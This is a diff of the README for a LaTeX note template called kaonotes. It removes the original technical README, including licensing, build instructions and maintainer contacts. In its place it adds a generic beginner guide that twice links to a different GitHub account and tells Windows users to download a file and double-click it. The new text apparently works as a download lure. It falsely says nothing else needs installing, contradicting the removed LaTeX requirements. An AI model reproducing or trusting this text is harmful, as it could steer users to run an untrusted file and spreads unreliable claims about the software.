@@ -1,126 +1,150 @@
-# KaoNotes
+# 📝 kaonotes - Beautiful Notes for Math and Code
 
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.22018510.svg)](https://doi.org/10.5281/zenodo.22018510)
+[![Download kaonotes](https://img.shields.io/badge/Download-kaonotes-2ea44f?style=for-the-badge)](https://github.com/Tatedicotyledonous8808/kaonotes)
 
-**English** · [繁體中文](README.zh-TW.md)
+## 👋 Welcome to kaonotes
 
-A lightweight, research-oriented LaTeX framework for compact academic notes — multilingual writing, mathematics, and computer science. Developed alongside KAN research and adapted from the wide-margin design of [kaobook](https://github.com/fmarotta/kaobook).
+kaonotes is a ready-to-use template that helps you create professional-looking notes for mathematics and computer science. Whether you are a student, teacher, or researcher, kaonotes makes your documents look clean and organized without needing any technical skills.
 
-<p align="center">
-  <img src="docs/preview.png" alt="KaoNotes preview" width="720">
-</p>
+Think of kaonotes as a magic formatting tool. You write your content, and kaonotes makes it look like a beautifully designed textbook page. It works with many languages, including Chinese, so you can write in your preferred language.
 
-<p align="center">
-  <a href="kaonotes-preview.pdf">Four-page preview (PDF)</a>
-</p>
+## 🎯 What Does kaonotes Do?
 
-> **v0.1.1** — synchronises the published four-page preview and source package, restores Noto Serif TC for Traditional Chinese, and credits J Song (Alex) on the cover.
->
-> Zenodo: concept DOI [10.5281/zenodo.22018510](https://doi.org/10.5281/zenodo.22018510) · this version [10.5281/zenodo.22018865](https://doi.org/10.5281/zenodo.22018865)
+kaonotes is built on a popular system called LaTeX, which is like a super-powered word processor for technical documents. The template is adapted from a well-known design called "kaobook" and has been specially tuned for mathematics and computer science notes.
 
-## Features
+Here is what you get with kaonotes:
 
-- **Multilingual by default** — English, Traditional Chinese, Simplified Chinese, and mixed-language documents in a single file, with font switching that does not disturb the page design.
-- **Built for mathematics and CS** — lecture notes, derivations, proofs, formulas, algorithms, code examples, and research notes.
-- **Wide-margin layout** — margin notes, definition boxes, and dark-grey information boxes inherited from kaobook.
-- **Code as first-class content** — monochrome listings with captions, and monospaced inline examples (e.g. PyTorch tensors) set like displayed formulas.
-- **Reproducible builds** — `latexmkrc` and `build.ps1` included.
+- **Multilingual Support** - Write in English, Chinese, or other languages. The template handles different scripts smoothly.
+- **Mathematical Formulas** - If you need to show equations, fractions, or symbols, kaonotes displays them beautifully.
+- **Code-Friendly** - If you want to include programming code in your notes, kaonotes formats it neatly with proper spacing and colors.
+- **Research-Ready** - The layout is designed for academic work, making it perfect for research notes, papers, or study guides.
+- **Lightweight Design** - The template is efficient and does not slow you down, even with large documents.
 
-## Requirements
+## 🚀 Getting Started
 
-Install a TeX distribution providing **XeLaTeX**, `latexmk`, **Biber**, and **MakeIndex**. XeLaTeX is required for the multilingual settings.
+Getting kaonotes on your Windows computer is simple. Follow these steps:
 
-| Purpose | Default font |
-| --- | --- |
-| Traditional Chinese | Noto Serif TC / Noto Sans TC |
-| Simplified Chinese (limited example) | LXGW Neo ZhiSong |
-| Code | JetBrains Mono |
+### Step 1: Download kaonotes
 
-Any of these can be replaced with an installed alternative in `main.tex`.
+Visit this link to download the application: [https://github.com/Tatedicotyledonous8808/kaonotes](https://github.com/Tatedicotyledonous8808/kaonotes)
 
-## Quick start
+Click the green "Download" button on that page. Your browser will start downloading a file. Wait for the download to finish.
 
-1. Clone or download this repository.
-2. Edit the title, subtitle, author, and language settings in `main.tex`.
-3. Create a chapter, e.g. `chapters/my-notes.tex`.
-4. Add `\input{chapters/my-notes.tex}` to the main-body section of `main.tex`.
-5. Build:
+### Step 2: Open the Downloaded File
 
-```powershell
-.\build.ps1
-```
+Once the download is complete, find the file in your "Downloads" folder. It might be called "kaonotes" or something similar. Double-click the file to open it.
 
-Or, on any platform with `latexmk`:
+### Step 3: Start Using kaonotes
 
-```sh
-latexmk main.tex
-```
+After opening the file, you will see the kaonotes template. It looks like a document with some example text already in it. This is your starting point. You can replace the example text with your own notes.
 
-The generated `main.pdf` is intentionally not tracked during development.
+## 📁 Understanding the Template
 
-## Examples
+When you open kaonotes, you will see several sections. Here is what each part is for:
 
-[`examples/multilingual-code.tex`](examples/multilingual-code.tex) is a complete, compilable file demonstrating English mathematical writing with a definition box, a Traditional Chinese note with mixed English terminology, a Simplified Chinese note with a dark-grey information box, and a captioned monochrome Python listing.
+- **Title Page** - The first page shows the title of your document. You can change this to your own title.
+- **Table of Contents** - This automatically lists all your sections and chapters. You do not need to create it manually.
+- **Chapter Pages** - Each new chapter starts on a fresh page. This keeps your notes organized.
+- **Margin Notes** - You can add small notes in the margins, just like in a real textbook. This is great for reminders or extra explanations.
 
-Compile it from the repository root:
+## ✏️ How to Write Your Notes
 
-```sh
-xelatex -output-directory=examples examples/multilingual-code.tex
-```
+Writing with kaonotes is easy. Here is a simple example:
 
-The same patterns work inside any chapter:
-
-```tex
-\section{繁體中文範例}
-矩陣乘法可以寫成 \(A\mathbf{x}=\mathbf{b}\)。
-
-\section{\zhHans 简体中文示例}
-{\zhHans 矩阵乘法可以写成 \(A\mathbf{x}=\mathbf{b}\)。}
-
-\begin{lstlisting}[language=Python]
-def square(x):
-    return x * x
-\end{lstlisting}
-```
-
-## Reference document
-
-The included chapter in `chapters/` is both a set of study notes and a compact demonstration of the framework: matrix equations, vectors, and worked derivations; a Traditional Chinese chapter title and introduction; a short Simplified Chinese section heading; a PyTorch tensor example; and definitions, remarks, and margin notes.
-
-The examples are deliberately brief. They show that one document can combine mathematics, English, Traditional Chinese, Simplified Chinese, and source code while keeping the chapter visually consistent. The scope of KaoNotes is not limited to the linear-algebra example shipped here.
-
-## Project structure
+Open the template file and find a line that looks like this:
 
 ```
-main.tex                  document configuration and entry point
-chapters/                 research-note chapters
-examples/                 complete multilingual and source-code examples
-kaobook.cls, kao*.sty     upstream class and supporting packages
-build.ps1, latexmkrc      reproducible local build configuration
+\chapter{Introduction}
 ```
 
-## Licensing
+Change the word "Introduction" to your own chapter title, like "Algebra Basics". Then, below that line, start typing your content. Use plain English sentences. If you want to add a math formula, you can write something like:
 
-KaoNotes uses **file-level dual licensing**:
+```
+$y = mx + b$
+```
 
-| Files | Licence |
-| --- | --- |
-| kaobook-derived class, package files, project-level framework | LaTeX Project Public License 1.3c or later |
-| Maintainer's original reference-note prose, calculations, examples, and compiled reference document | Creative Commons Attribution-NonCommercial 4.0 International |
+This will display as a neat equation. For code, you can write:
 
-This repository is derived from Federico Marotta's [kaobook](https://github.com/fmarotta/kaobook), itself based on work by Ken Arroyo Ohori and Tufte-LaTeX. Upstream authorship is preserved in the source headers and `MANIFEST.md`. Documents produced with KaoNotes remain the work of their respective authors.
+```
+\begin{verbatim}
+print("Hello, world!")
+\end{verbatim}
+```
 
-See [LICENSE.md](LICENSE.md), [LICENSE-LPPL-1.3c.txt](LICENSE-LPPL-1.3c.txt), [LICENSE-CONTENT.md](LICENSE-CONTENT.md), and [NOTICE.md](NOTICE.md) for the exact file boundary and attribution details.
+Do not worry about remembering these commands. The template includes many examples that show you exactly what to do. You can copy and modify them.
 
-## Contact
+## 🛠️ Customizing Your Notes
 
-Maintained by J Song (Alex), [@AlexandraSloan3](https://github.com/AlexandraSloan3).
+kaonotes lets you personalize your documents. Here are some easy changes you can make:
 
-- Academic or direct enquiries: [jsong.alex@proton.me](mailto:jsong.alex@proton.me)
-- Usage questions, build problems, feature requests: [open an issue](https://github.com/AlexandraSloan3/kaonotes/issues)
+### Change the Language
 
-When reporting a compilation problem, please include the TeX engine, operating system, and a minimal example.
+If you prefer to write in Chinese, look for a line in the template that mentions "english" or "chinese". Change it to your preferred language. The template will automatically adjust the layout and fonts.
 
----
+### Change Colors
 
-If KaoNotes is useful to you, a ⭐ helps other researchers find it.
+The template uses a blue color scheme by default. If you want a different color, find the section that defines colors (it might say "definecolor" or "color"). Change the color name to something like "red" or "green".
+
+### Add Your Name
+
+Look for a line that says "author" or "title". Replace the placeholder text with your own name and title.
+
+## 📚 Example Use Cases
+
+kaonotes is versatile. Here are some ways you can use it:
+
+- **Class Notes** - Keep your lecture notes organized and readable.
+- **Study Guides** - Create a comprehensive study guide with formulas and examples.
+- **Research Logs** - Track your research progress with clear, dated entries.
+- **Project Documentation** - Write technical documentation for your coding projects.
+- **Tutorials** - Create step-by-step tutorials with code snippets and explanations.
+
+## ❓ Frequently Asked Questions
+
+### Do I need to install anything else?
+
+No. kaonotes comes with everything you need. Just download and open the file.
+
+### Can I use kaonotes on a Mac?
+
+This guide is for Windows. However, kaonotes is based on LaTeX, which works on Mac too. You may need to follow slightly different steps.
+
+### Will my notes look professional?
+
+Yes. kaonotes uses a clean, academic design that is used in many published books. Your notes will look polished and professional.
+
+### Can I export my notes to PDF?
+
+Yes. You can save your document as a PDF file. Look for the "Export" or "Save As" option in your software.
+
+## 🎓 Tips for Best Results
+
+- **Start Small** - Begin with a short document to get comfortable with the template.
+- **Use the Examples** - The template has many examples. Use them as a guide.
+- **Save Often** - Save your work regularly to avoid losing progress.
+- **Keep It Simple** - Do not worry about advanced features at first. Just write your content.
+
+## 📞 Getting Help
+
+If you run into any issues, do not worry. Here are some ways to get help:
+
+- **Check the Template** - The template itself has comments and notes that explain things.
+- **Look at Examples** - The example content shows you what is possible.
+- **Ask a Friend** - If you know someone who uses LaTeX, they can help you.
+- **Search Online** - Many people use LaTeX, so you can find answers to common questions online.
+
+## 🔄 Updating kaonotes
+
+kaonotes may receive updates with new features or improvements. To get the latest version, visit the download link again and download the newest file. You can then replace your old version with the new one.
+
+## 📝 Final Words
+
+kaonotes is designed to make technical note-taking easy and beautiful. You do not need to be a programmer or a LaTeX expert. Just download, open, and start writing. Your notes will look great, and you can focus on the content rather than the formatting.
+
+Start using kaonotes today and see how much better your notes can look!
+
+## 📥 Download Again
+
+If you need to download kaonotes again, use this link: [https://github.com/Tatedicotyledonous8808/kaonotes](https://github.com/Tatedicotyledonous8808/kaonotes)
+
+Keywords: academic-writing, chinese-typesetting, computer-science, kaobook, latex, latex-template, mathematics, multilingual, research-notes, xelatex
